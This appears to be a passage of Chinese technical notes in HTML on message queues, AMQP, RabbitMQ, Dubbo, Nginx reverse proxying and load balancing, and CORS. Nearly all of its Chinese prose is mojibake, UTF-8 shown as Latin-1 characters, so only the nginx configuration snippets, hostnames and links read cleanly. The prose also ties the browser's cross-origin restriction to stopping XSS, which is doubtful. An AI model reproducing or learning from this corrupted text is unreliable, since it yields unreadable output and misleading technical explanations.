<li><p>å¹¿æ’­<br>å°çº¢åªéœ€è¦åŠ³åŠ¨ä¸€æ¬¡,å°±å¯ä»¥è®©å¤šä¸ªå°ä¼™ä¼´æœ‰ä¹¦å¯è¯»,è¿™å¤§å¤§åœ°èŠ‚çœäº†å¥¹çš„æ—¶é—´,ä¹Ÿè®©æ–°çš„å°ä¼™ä¼´çš„åŠ å…¥æˆæœ¬å¾ˆä½ã€‚</p>
</li>
<li><p>å‰Šå³°<br>å‡è®¾å°æ˜è¯»ä¹¦å¾ˆæ…¢,å¦‚æœé‡‡ç”¨å°çº¢æ¯ç»™ä¸€æœ¬ä¹¦éƒ½ç›‘ç£å°æ˜è¯»å®Œçš„æ–¹å¼,å°æ˜æœ‰å‹åŠ›,å°çº¢ä¹Ÿä¸è€çƒ¦ã€‚<br>åæ­£å°çº¢ç»™ä¹¦çš„é¢‘ç‡ä¹Ÿä¸ç¨³å®š,å¦‚æœä»Šæ˜ä¸¤å¤©è¿ç»™äº†äº”æœ¬,ä¹‹åéš”ä¸‰ä¸ªæœˆæ‰åˆç»™ä¸€æœ¬,é‚£å°æ˜åªè¦åœ¨ä¸‰ä¸ªæœˆå†…ä»ä¹¦æ¶ä¸Šé™†ç»­å–èµ°äº”æœ¬ä¹¦è¯»å®Œå°±è¡Œäº†,å‹åŠ›å°±ä¸é‚£ä¹ˆå¤§äº†ã€‚</p>
</li>
</ol>
<p>å½“ç„¶,ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ä¹Ÿæœ‰å…¶æˆæœ¬ï¼š</p>
<ol>
<li>å¼•å…¥å¤æ‚åº¦<br>æ¯«æ— ç–‘é—®,ã€Œä¹¦æ¶ã€è¿™ä¸œè¥¿æ˜¯å¤šå‡ºæ¥çš„,éœ€è¦åœ°æ–¹æ”¾å®ƒ,è¿˜éœ€è¦é˜²ç›—ã€‚</li>
<li>æš‚æ—¶çš„ä¸ä¸€è‡´æ€§<br>å‡å¦‚å¦ˆå¦ˆé—®å°çº¢ã€Œå°æ˜æœ€è¿‘è¯»äº†ä»€ä¹ˆä¹¦ã€,åœ¨ä»¥å‰çš„æ–¹å¼é‡Œ,å°çº¢å› ä¸ºäº²çœ¼ç›‘ç£å°æ˜è¯»å®Œä¹¦äº†,å¯ä»¥åº•æ°”åè¶³åœ°å‘Šè¯‰å¦ˆå¦ˆ,ä½†æ–°çš„æ–¹å¼é‡Œ,å°çº¢å›ç­”å¦ˆå¦ˆä¹‹åä¼šå¿ƒæƒ³ã€Œå°æ˜åº”è¯¥ä¼šå¾ˆå¿«çœ‹å®Œå§â€¦..ã€<br>è¿™ä¸­é—´å­˜åœ¨ç€ä¸€æ®µã€Œå¦ˆå¦ˆè®¤ä¸ºå°æ˜çœ‹äº†æŸä¹¦,è€Œå°æ˜å…¶å®è¿˜æ²¡çœ‹ã€çš„æ—¶æœŸ,å½“ç„¶,å°æ˜æœ€ç»ˆçš„é˜…è¯»çŠ¶æ€ä¸å¦ˆå¦ˆçš„è®¤çŸ¥ä¼šæ˜¯ä¸€è‡´çš„,è¿™å°±æ˜¯æ‰€è°“çš„ã€Œæœ€ç»ˆä¸€è‡´æ€§ã€ã€‚</li>
</ol>
<p>é‚£ä¹ˆ,è¯¥ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„æƒ…å†µéœ€è¦æ»¡è¶³ä»€ä¹ˆæ¡ä»¶å‘¢?</p>
<ol>
<li><p>ç”Ÿäº§è€…ä¸éœ€è¦ä»æ¶ˆè´¹è€…å¤„è·å¾—åé¦ˆ</p>
<p>å¼•å…¥æ¶ˆæ¯é˜Ÿåˆ—ä¹‹å‰çš„ç›´æ¥è°ƒç”¨,å…¶æ¥å£çš„è¿”å›å€¼åº”è¯¥ä¸ºç©º,è¿™æ‰è®©æ˜æ˜ä¸‹å±‚çš„åŠ¨ä½œè¿˜æ²¡åš,ä¸Šå±‚å´å½“æˆåŠ¨ä½œåšå®Œäº†ç»§ç»­å¾€åèµ°â€”â€”å³æ‰€è°“å¼‚æ­¥â€”â€”æˆä¸ºäº†å¯èƒ½ã€‚<br>å°çº¢æ”¾å®Œä¹¦ä¹‹åå°æ˜åˆ°åº•çœ‹äº†æ²¡æœ‰,å°çº¢æ ¹æœ¬ä¸é—®,å¥¹é»˜è®¤ä»–æ˜¯çœ‹äº†,å¦åˆ™å°±åªèƒ½ç”¨åŸæ¥çš„æ–¹æ³•ç›‘ç£åˆ°çœ‹å®Œäº†ã€‚   </p>
</li>
<li><p>å®¹è®¸çŸ­æš‚çš„ä¸ä¸€è‡´æ€§<br>å¦ˆå¦ˆå¯èƒ½ä¼šå‘ç°ã€Œæœ‰æ—¶å€™æ®è¯´å°æ˜çœ‹äº†æŸä¹¦,ä½†äº‹å®ä¸Šä»–è¿˜æ²¡çœ‹ã€,åªè¦å¦ˆå¦ˆæ»¡æ„äºã€Œåæ­£ä»–æœ€åçœ‹äº†å°±è¡Œã€,å¼‚æ­¥å¤„ç†å°±æ²¡é—®é¢˜ã€‚<br>å¦‚æœå¦ˆå¦ˆå¯¹è¿™æƒ…å†µä¸èƒ½å®¹å¿,å¯¹å°çº¢å¤§å‘é›·éœ†,å°çº¢ä¹Ÿå°±ä¸æ•¢ç”¨ä¹¦æ¶æ–¹å¼äº†ã€‚</p>
</li>
<li><p>ç¡®å®æ˜¯ç”¨äº†æœ‰æ•ˆæœ<br>å³è§£è€¦ã€æé€Ÿã€å¹¿æ’­ã€å‰Šå³°è¿™äº›æ–¹é¢çš„æ”¶ç›Š,è¶…è¿‡æ”¾ç½®ä¹¦æ¶ã€ç›‘æ§ä¹¦æ¶è¿™äº›æˆæœ¬ã€‚<br>å¦åˆ™å¦‚æœæ˜¯ç›²ç›®ç…§æ¬,ã€Œå¬è¯´è€èµµå®¶ä¹°äº†ä¹¦æ¶,å’±ä»¬å®¶ä¹Ÿä¹°ä¸€ä¸ªã€,ä¹°å›æ¥å´æ²¡ä»€ä¹ˆç”¨,åªæ˜¯è®©æ­¥éª¤å˜å¤šäº†,è¿˜ä¸å¦‚ç›´æ¥æŠŠä¹¦é€’ç»™å¯¹æ–¹å‘¢,é‚£å°±ä¸å¯¹äº†ã€‚</p>
</li>
</ol>
<p>ä¸ªäººè®¤ä¸ºæ¶ˆæ¯é˜Ÿåˆ—çš„ä¸»è¦ç‰¹ç‚¹æ˜¯å¼‚æ­¥å¤„ç†ï¼Œä¸»è¦ç›®çš„æ˜¯å‡å°‘è¯·æ±‚å“åº”æ—¶é—´å’Œè§£è€¦ã€‚æ‰€ä»¥ä¸»è¦çš„ä½¿ç”¨åœºæ™¯å°±æ˜¯å°†æ¯”è¾ƒè€—æ—¶è€Œä¸”ä¸éœ€è¦å³æ—¶ï¼ˆåŒæ­¥ï¼‰è¿”å›ç»“æœçš„æ“ä½œä½œä¸ºæ¶ˆæ¯æ”¾å…¥æ¶ˆæ¯é˜Ÿåˆ—ã€‚åŒæ—¶ç”±äºä½¿ç”¨äº†æ¶ˆæ¯é˜Ÿåˆ—ï¼Œåªè¦ä¿è¯æ¶ˆæ¯æ ¼å¼ä¸å˜ï¼Œæ¶ˆæ¯çš„å‘é€æ–¹å’Œæ¥æ”¶æ–¹å¹¶ä¸éœ€è¦å½¼æ­¤è”ç³»ï¼Œä¹Ÿä¸éœ€è¦å—å¯¹æ–¹çš„å½±å“ï¼Œå³è§£è€¦å’Œã€‚</p>
<p>ä½¿ç”¨åœºæ™¯çš„è¯ï¼Œä¸¾ä¸ªä¾‹å­ï¼š<br>å‡è®¾ç”¨æˆ·åœ¨ä½ çš„è½¯ä»¶ä¸­æ³¨å†Œï¼ŒæœåŠ¡ç«¯æ”¶åˆ°ç”¨æˆ·çš„æ³¨å†Œè¯·æ±‚åï¼Œå®ƒä¼šåšè¿™äº›æ“ä½œï¼š</p>
<ol>
<li>æ ¡éªŒç”¨æˆ·åç­‰ä¿¡æ¯ï¼Œå¦‚æœæ²¡é—®é¢˜ä¼šåœ¨æ•°æ®åº“ä¸­æ·»åŠ ä¸€ä¸ªç”¨æˆ·è®°å½•</li>
<li>å¦‚æœæ˜¯ç”¨é‚®ç®±æ³¨å†Œä¼šç»™ä½ å‘é€ä¸€å°æ³¨å†ŒæˆåŠŸçš„é‚®ä»¶ï¼Œæ‰‹æœºæ³¨å†Œåˆ™ä¼šå‘é€ä¸€æ¡çŸ­ä¿¡</li>
<li>åˆ†æç”¨æˆ·çš„ä¸ªäººä¿¡æ¯ï¼Œä»¥ä¾¿å°†æ¥å‘ä»–æ¨èä¸€äº›å¿—åŒé“åˆçš„äººï¼Œæˆ–å‘é‚£äº›äººæ¨èä»–</li>
<li>å‘é€ç»™ç”¨æˆ·ä¸€ä¸ªåŒ…å«æ“ä½œæŒ‡å—çš„ç³»ç»Ÿé€šçŸ¥</li>
<li>ç­‰ç­‰â€¦â€¦</li>
</ol>
<p>ä½†æ˜¯å¯¹äºç”¨æˆ·æ¥è¯´ï¼Œæ³¨å†ŒåŠŸèƒ½å®é™…åªéœ€è¦ç¬¬ä¸€æ­¥ï¼Œåªè¦æœåŠ¡ç«¯å°†ä»–çš„è´¦æˆ·ä¿¡æ¯å­˜åˆ°æ•°æ®åº“ä¸­ä»–ä¾¿å¯ä»¥ç™»å½•ä¸Šå»åšä»–æƒ³åšçš„äº‹æƒ…äº†ã€‚è‡³äºå…¶ä»–çš„äº‹æƒ…ï¼Œéè¦åœ¨è¿™ä¸€æ¬¡è¯·æ±‚ä¸­å…¨éƒ¨å®Œæˆä¹ˆï¼Ÿå€¼å¾—ç”¨æˆ·æµªè´¹æ—¶é—´ç­‰ä½ å¤„ç†è¿™äº›å¯¹ä»–æ¥è¯´æ— å…³ç´§è¦çš„äº‹æƒ…ä¹ˆï¼Ÿæ‰€ä»¥å®é™…å½“ç¬¬ä¸€æ­¥åšå®Œåï¼ŒæœåŠ¡ç«¯å°±å¯ä»¥æŠŠå…¶ä»–çš„æ“ä½œæ”¾å…¥å¯¹åº”çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­ç„¶åé©¬ä¸Šè¿”å›ç”¨æˆ·ç»“æœï¼Œç”±æ¶ˆæ¯é˜Ÿåˆ—å¼‚æ­¥çš„è¿›è¡Œè¿™äº›æ“ä½œã€‚</p>
<p>æˆ–è€…è¿˜æœ‰ä¸€ç§æƒ…å†µï¼ŒåŒæ—¶æœ‰å¤§é‡ç”¨æˆ·æ³¨å†Œä½ çš„è½¯ä»¶ï¼Œåœ¨é«˜å¹¶å‘æƒ…å†µä¸‹æ³¨å†Œè¯·æ±‚å¼€å§‹å‡ºç°ä¸€äº›é—®é¢˜ï¼Œä¾‹å¦‚é‚®ä»¶æ¥å£æ‰¿å—ä¸ä½ï¼Œæˆ–æ˜¯åˆ†æä¿¡æ¯æ—¶çš„å¤§é‡è®¡ç®—ä½¿cpuæ»¡è½½ï¼Œè¿™å°†ä¼šå‡ºç°è™½ç„¶ç”¨æˆ·æ•°æ®è®°å½•å¾ˆå¿«çš„æ·»åŠ åˆ°æ•°æ®åº“ä¸­äº†ï¼Œä½†æ˜¯å´å¡åœ¨å‘é‚®ä»¶æˆ–åˆ†æä¿¡æ¯æ—¶çš„æƒ…å†µï¼Œå¯¼è‡´è¯·æ±‚çš„å“åº”æ—¶é—´å¤§å¹…å¢é•¿ï¼Œç”šè‡³å‡ºç°è¶…æ—¶ï¼Œè¿™å°±æœ‰ç‚¹ä¸åˆ’ç®—äº†ã€‚é¢å¯¹è¿™ç§æƒ…å†µä¸€èˆ¬ä¹Ÿæ˜¯å°†è¿™äº›æ“ä½œæ”¾å…¥æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹ï¼‰ï¼Œæ¶ˆæ¯é˜Ÿåˆ—æ…¢æ…¢çš„è¿›è¡Œå¤„ç†ï¼ŒåŒæ—¶å¯ä»¥å¾ˆå¿«çš„å®Œæˆæ³¨å†Œè¯·æ±‚ï¼Œä¸ä¼šå½±å“ç”¨æˆ·ä½¿ç”¨å…¶ä»–åŠŸèƒ½ã€‚</p>
<p>æ‰€ä»¥åœ¨è½¯ä»¶çš„æ­£å¸¸åŠŸèƒ½å¼€å‘ä¸­ï¼Œå¹¶ä¸éœ€è¦å»åˆ»æ„çš„å¯»æ‰¾æ¶ˆæ¯é˜Ÿåˆ—çš„ä½¿ç”¨åœºæ™¯ï¼Œè€Œæ˜¯å½“å‡ºç°æ€§èƒ½ç“¶é¢ˆæ—¶ï¼Œå»æŸ¥çœ‹ä¸šåŠ¡é€»è¾‘æ˜¯å¦å­˜åœ¨å¯ä»¥å¼‚æ­¥å¤„ç†çš„è€—æ—¶æ“ä½œï¼Œå¦‚æœå­˜åœ¨çš„è¯ä¾¿å¯ä»¥å¼•å…¥æ¶ˆæ¯é˜Ÿåˆ—æ¥è§£å†³ã€‚å¦åˆ™ç›²ç›®çš„ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—å¯èƒ½ä¼šå¢åŠ ç»´æŠ¤å’Œå¼€å‘çš„æˆæœ¬å´æ— æ³•å¾—åˆ°å¯è§‚çš„æ€§èƒ½æå‡ï¼Œé‚£å°±å¾—ä¸å¿å¤±äº†ã€‚</p>
<h2 id="AMQP"><a href="#AMQP" class="headerlink" title="AMQP"></a>AMQP</h2><p>ä¸€ä¸ªæä¾›ç»Ÿä¸€æ¶ˆæ¯æœåŠ¡çš„åº”ç”¨å±‚æ ‡å‡†é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®ï¼Œæ˜¯ä¸€ä¸ªé€šç”¨çš„åº”ç”¨å±‚åè®®ã€‚</p>
<p>æ¶ˆæ¯å‘é€ä¸æ¥æ”¶çš„åŒæ–¹éµå®ˆè¿™ä¸ªåè®®å¯ä»¥å®ç°å¼‚æ­¥é€šè®¯ã€‚è¿™ä¸ªåè®®çº¦å®šäº†æ¶ˆæ¯çš„æ ¼å¼å’Œå·¥ä½œæ–¹å¼ã€‚</p>
<h2 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h2><p>RabbitMqæ˜¯ä¸€ä¸ªå®ç°äº†AMQP(Advanced Message Queuing Protocol)é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®çš„æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡ï¼Œç”¨Erlangè¯­è¨€ç¼–å†™çš„ã€‚</p>
<h1 id="Dubbo"><a href="#Dubbo" class="headerlink" title="Dubbo"></a>Dubbo</h1><p>dubboæœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ªæœåŠ¡è½¯ä»¶ã€‚å®ƒå…¶å®å°±æ˜¯ä¸€ä¸ªjaråŒ…èƒ½å¤Ÿå¸®ä½ çš„javaç¨‹åºè¿æ¥åˆ°zookeeperï¼Œå¹¶åˆ©ç”¨zookeeperæ¶ˆè´¹ã€æä¾›æœåŠ¡ã€‚æ‰€ä»¥ä½ ä¸ç”¨åœ¨Linuxä¸Šå¯åŠ¨ä»€ä¹ˆdubboæœåŠ¡ã€‚</p>
<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="åå‘ä»£ç†åŸç†"><a href="#åå‘ä»£ç†åŸç†" class="headerlink" title="åå‘ä»£ç†åŸç†"></a>åå‘ä»£ç†åŸç†</h2><p>ä»€ä¹ˆæ˜¯åå‘ä»£ç†ï¼Ÿ</p>
<ul>
<li>ä»£ç†ï¼šé€šè¿‡å®¢æˆ·æœºçš„é…ç½®ï¼Œå®ç°è®©ä¸€å°æœåŠ¡å™¨ä»£ç†å®¢æˆ·æœºï¼Œå®¢æˆ·çš„æ‰€æœ‰è¯·æ±‚éƒ½äº¤ç»™ä»£ç†æœåŠ¡å™¨å¤„ç†ã€‚</li>
<li>åå‘ä»£ç†ï¼šç”¨ä¸€å°æœåŠ¡å™¨ï¼Œä»£ç†çœŸå®æœåŠ¡å™¨ï¼Œç”¨æˆ·è®¿é—®æ—¶ï¼Œä¸å†æ˜¯è®¿é—®çœŸå®æœåŠ¡å™¨ï¼Œè€Œæ˜¯ä»£ç†æœåŠ¡å™¨ã€‚</li>
</ul>
<p>nginxå¯ä»¥å½“åšåå‘ä»£ç†æœåŠ¡å™¨æ¥ä½¿ç”¨ï¼š</p>
<ul>
<li>æˆ‘ä»¬éœ€è¦æå‰åœ¨nginxä¸­é…ç½®å¥½åå‘ä»£ç†çš„è§„åˆ™ï¼Œä¸åŒçš„è¯·æ±‚ï¼Œäº¤ç»™ä¸åŒçš„çœŸå®æœåŠ¡å™¨å¤„ç†</li>
<li>å½“è¯·æ±‚åˆ°è¾¾nginxï¼Œnginxä¼šæ ¹æ®å·²ç»å®šä¹‰çš„è§„åˆ™è¿›è¡Œè¯·æ±‚çš„è½¬å‘ï¼Œä»è€Œå®ç°è·¯ç”±åŠŸèƒ½</li>
</ul>
<p>åˆ©ç”¨åå‘ä»£ç†ï¼Œå°±å¯ä»¥è§£å†³æˆ‘ä»¬å‰é¢æ‰€è¯´çš„ç«¯å£é—®é¢˜ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022654.png" alt="image-20200111175118787"></p>
<h2 id="è´Ÿè½½å‡è¡¡ï¼ˆäº†è§£ï¼‰"><a href="#è´Ÿè½½å‡è¡¡ï¼ˆäº†è§£ï¼‰" class="headerlink" title="è´Ÿè½½å‡è¡¡ï¼ˆäº†è§£ï¼‰"></a>è´Ÿè½½å‡è¡¡ï¼ˆäº†è§£ï¼‰</h2><p>æˆ‘ä»¬çš„nginxåå‘ä»£ç†ï¼Œç›®æ ‡æœåŠ¡å™¨åœ°å€æ˜¯é€šè¿‡IPå’ŒPortæ¥æŒ‡å®šï¼Œé‚£ä¹ˆæ–°çš„é—®é¢˜æ¥äº†ï¼š</p>
<p>å¦‚æœæˆ‘ä»¬çš„<code>leyou-manage</code>ä¸æ˜¯å•èŠ‚ç‚¹ï¼Œè€Œæ˜¯ä¸€ä¸ªæœåŠ¡é›†ç¾¤ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022655.png" alt="image-20200113094533555"></p>
<h3 id="è´Ÿè½½å‡è¡¡è½®è¯¢ç­–ç•¥"><a href="#è´Ÿè½½å‡è¡¡è½®è¯¢ç­–ç•¥" class="headerlink" title="è´Ÿè½½å‡è¡¡è½®è¯¢ç­–ç•¥"></a>è´Ÿè½½å‡è¡¡è½®è¯¢ç­–ç•¥</h3><p>é¦–å…ˆå®šä¹‰è´Ÿè½½å‡è¡¡çš„é›†ç¾¤èŠ‚ç‚¹ä¿¡æ¯ï¼ŒåŠè´Ÿè½½å‡è¡¡çš„ç­–ç•¥ï¼Œé»˜è®¤ç­–ç•¥æ˜¯è½®è¯¢ï¼Œé¡¾åæ€ä¹‰ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½æŒ‰ç…§æ—¶é—´é¡ºåºåˆ†é…åˆ°ä¸åŒçš„æœåŠ¡ä¸Šï¼Œå¦‚æœæœåŠ¡Downæ‰ï¼Œå¯ä»¥è‡ªåŠ¨å‰”é™¤ï¼Œæœ¬ä¾‹ä¸­é…ç½®å››ä¸ªèŠ‚ç‚¹è½®è¯¢ï¼š</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è´Ÿè½½å‡è¡¡é…ç½®ï¼Œé»˜è®¤æ˜¯è½®è¯¢</span></span><br><span class="line"><span class="section">upstream</span> leyou-manage&#123;</span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9003</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9004</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨åå‘ä»£ç†æ—¶ä¸è¦æŒ‡å‘å…·ä½“IPï¼Œè€Œæ˜¯è¿™é‡Œé…ç½®çš„ï¼š<code>leyou-manage</code>ã€‚</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">	<span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">	<span class="attribute">server_name</span>  manage.leyou.com;</span><br><span class="line">	</span><br><span class="line">	<span class="section">location</span> / &#123;</span><br><span class="line">	    <span class="attribute">proxy_pass</span>   http://leyou-manage;</span><br><span class="line">		<span class="attribute">proxy_connect_timeout</span> <span class="number">600</span>;</span><br><span class="line">		<span class="attribute">proxy_read_timeout</span> <span class="number">5000</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åŠ æƒè½®è¯¢"><a href="#åŠ æƒè½®è¯¢" class="headerlink" title="åŠ æƒè½®è¯¢"></a>åŠ æƒè½®è¯¢</h3><p>æŒ‡å®šæ¯ä¸ªæœåŠ¡çš„æƒé‡æ¯”ä¾‹ï¼Œweightå’Œè®¿é—®æ¯”ç‡æˆæ­£æ¯”ï¼Œé€šå¸¸ç”¨äºåç«¯æœåŠ¡æœºå™¨æ€§èƒ½ä¸ç»Ÿä¸€ï¼Œå°†æ€§èƒ½å¥½çš„åˆ†é…æƒé‡é«˜æ¥å‘æŒ¥æœåŠ¡å™¨æœ€å¤§æ€§èƒ½ï¼Œå¦‚ä¸‹é…ç½®å9001æœåŠ¡çš„è®¿é—®æ¯”ç‡ä¼šæ˜¯9002æœåŠ¡çš„äºŒå€ã€‚</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è´Ÿè½½å‡è¡¡é…ç½®ï¼Œé»˜è®¤æ˜¯è½®è¯¢</span></span><br><span class="line"><span class="section">upstream</span> leyou-manage&#123;</span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span> weight=<span class="number">1</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span> weight=<span class="number">2</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="IPå“ˆå¸Œ"><a href="#IPå“ˆå¸Œ" class="headerlink" title="IPå“ˆå¸Œ"></a>IPå“ˆå¸Œ</h3><p>æ¯ä¸ªè¯·æ±‚éƒ½æ ¹æ®è®¿é—®ipçš„hashç»“æœåˆ†é…ï¼Œç»è¿‡è¿™æ ·çš„å¤„ç†ï¼Œæ¯ä¸ªè®¿å®¢å›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span>  leyou-manage &#123;</span><br><span class="line">    ip_hash; </span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æœ€å°‘è¿æ¥"><a href="#æœ€å°‘è¿æ¥" class="headerlink" title="æœ€å°‘è¿æ¥"></a>æœ€å°‘è¿æ¥</h3><p>å°†è¯·æ±‚åˆ†é…åˆ°è¿æ¥æ•°æœ€å°‘çš„æœåŠ¡ä¸Šã€‚</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span> leyou-manage&#123;</span><br><span class="line">    least_conn;</span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ä½œä¸ºå›¾ç‰‡æœåŠ¡å™¨"><a href="#ä½œä¸ºå›¾ç‰‡æœåŠ¡å™¨" class="headerlink" title="ä½œä¸ºå›¾ç‰‡æœåŠ¡å™¨"></a>ä½œä¸ºå›¾ç‰‡æœåŠ¡å™¨</h2><p>å°†imagesæ”¾å…¥htmlç›®å½•ä¸‹,é€šè¿‡images.leyou.comè®¿é—®å›¾ç‰‡æœåŠ¡å™¨,å¯ä»¥é€šè¿‡é…ç½®å¼€å¯sendfileç³»ç»Ÿè°ƒç”¨, é›¶æ‹·è´;</p>
<h1 id="CORSè·¨åŸŸ"><a href="#CORSè·¨åŸŸ" class="headerlink" title="CORSè·¨åŸŸ"></a>CORSè·¨åŸŸ</h1><p>è·¨åŸŸæ˜¯æŒ‡è·¨åŸŸåçš„è®¿é—®ï¼Œä»¥ä¸‹æƒ…å†µéƒ½å±äºè·¨åŸŸï¼š</p>
<table>
<thead>
<tr>
<th>è·¨åŸŸåŸå› è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>ä¸€çº§æˆ–äºŒçº§åŸŸåä¸åŒ</td>
<td><code>www.jd.com</code> ä¸ <code>www.taobao.com</code></td>
</tr>
<tr>
<td>åŸŸåç›¸åŒï¼Œç«¯å£ä¸åŒ</td>
<td><code>www.jd.com:8080</code> ä¸ <code>www.jd.com:8081</code></td>
</tr>
<tr>
<td>ä¸‰çº§åŸŸåä¸åŒ</td>
<td><code>item.jd.com</code> ä¸ <code>miaosha.jd.com</code></td>
</tr>
</tbody></table>
<p>å¦‚æœ<strong>åŸŸåå’Œç«¯å£éƒ½ç›¸åŒï¼Œä½†æ˜¯è¯·æ±‚è·¯å¾„ä¸åŒ</strong>ï¼Œä¸å±äºè·¨åŸŸï¼Œå¦‚ï¼š</p>
<p><code>www.jd.com/item</code> </p>
<p><code>www.jd.com/goods</code></p>
<p>è€Œæˆ‘ä»¬åˆšæ‰æ˜¯ä»<code>manage.leyou.com</code>å»è®¿é—®<code>api.leyou.com</code>ï¼Œè¿™å±äºäºŒçº§åŸŸåä¸åŒï¼Œè·¨åŸŸäº†ã€‚</p>
<h2 id="ä¸ºä»€ä¹ˆæœ‰è·¨åŸŸé—®é¢˜ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆæœ‰è·¨åŸŸé—®é¢˜ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆæœ‰è·¨åŸŸé—®é¢˜ï¼Ÿ"></a>ä¸ºä»€ä¹ˆæœ‰è·¨åŸŸé—®é¢˜ï¼Ÿ</h2><p>è·¨åŸŸä¸ä¸€å®šä¼šæœ‰è·¨åŸŸé—®é¢˜ã€‚</p>
<p>å› ä¸ºè·¨åŸŸé—®é¢˜æ˜¯æµè§ˆå™¨å¯¹äºajaxè¯·æ±‚çš„ä¸€ç§å®‰å…¨é™åˆ¶ï¼š<strong>ä¸€ä¸ªé¡µé¢å‘èµ·çš„ajaxè¯·æ±‚ï¼Œåªèƒ½æ˜¯äºå½“å‰é¡µåŒåŸŸåçš„è·¯å¾„</strong>ï¼Œè¿™èƒ½æœ‰æ•ˆçš„é˜»æ­¢è·¨ç«™æ”»å‡»(XSS)ã€‚(åˆ©ç”¨ajaxå‘é€cookie)</p>
<p>å› æ­¤ï¼š<strong>è·¨åŸŸé—®é¢˜æ˜¯é’ˆå¯¹ajaxçš„ä¸€ç§é™åˆ¶</strong>ã€‚</p>
<p>ä½†æ˜¯è¿™å´ç»™æˆ‘ä»¬çš„å¼€å‘å¸¦æ¥äº†ä¸å˜ï¼Œè€Œä¸”åœ¨å®é™…ç”Ÿæˆç¯å¢ƒä¸­ï¼Œè‚¯å®šä¼šæœ‰å¾ˆå¤šå°æœåŠ¡å™¨ä¹‹é—´äº¤äº’ï¼Œåœ°å€å’Œç«¯å£éƒ½å¯èƒ½ä¸åŒï¼Œæ€ä¹ˆåŠï¼Ÿ</p>
<h2 id="è§£å†³è·¨åŸŸé—®é¢˜çš„æ–¹æ¡ˆ"><a href="#è§£å†³è·¨åŸŸé—®é¢˜çš„æ–¹æ¡ˆ" class="headerlink" title="è§£å†³è·¨åŸŸé—®é¢˜çš„æ–¹æ¡ˆ"></a>è§£å†³è·¨åŸŸé—®é¢˜çš„æ–¹æ¡ˆ</h2><p>æµè§ˆå™¨è™½ç„¶ä¼šé™åˆ¶è·¨åŸŸè¯·æ±‚ï¼Œä½†æ˜¯ä¹Ÿç»™å‡ºäº†è§£å†³æ–¹æ¡ˆã€‚å¦‚æœä½ ç¡®å®éœ€è¦å‘é€è·¨åŸŸçš„ajaxï¼Œå¿…é¡»é€šè¿‡è¢«è®¿é—®çš„æœåŠ¡ç«¯åŒæ„æ‰å¯ä»¥ã€‚æµè§ˆå™¨ä¸æœåŠ¡å™¨é—´åå•†æ˜¯å¦å…è®¸è·¨åŸŸï¼Œè¿™æ ·çš„æ–¹å¼å°±æ˜¯CORSã€‚</p>
<p>å‚è€ƒæ–‡æ¡£ï¼š<a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>
